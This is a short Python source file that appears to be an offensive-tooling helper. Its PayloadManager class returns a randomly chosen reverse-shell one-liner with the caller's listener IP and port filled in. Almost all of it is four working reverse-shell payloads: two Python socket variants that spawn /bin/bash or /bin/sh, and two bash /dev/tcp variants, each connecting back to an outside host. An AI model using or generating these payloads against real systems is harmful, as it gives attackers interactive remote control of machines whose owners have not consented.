import requests
import random

class PayloadManager:
    def __init__(self):
        # In a full implementation, we would parse the raw markdown from GitHub.
        # For reliability, we use a curated list based on the repo's content.
        self.repo_url = "https://github.com/swisskyrepo/PayloadsAllTheThings"
        
    def get_random_oneliner(self, lhost, lport, type='python'):
        """
        Returns a randomized one-liner shell populated with your IP/Port
        """
        if type == 'python':
            payloads = [
                # Standard Python3 socket
                f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'',
                # Python subprocess method
                f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
            ]
        elif type == 'bash':
            payloads = [
                # Standard Bash TCP
                f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
                # File Descriptor method
                f'0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196'
            ]
        else:
            return f"echo 'Payload type {type} not supported'"
            
        return random.choice(payloads)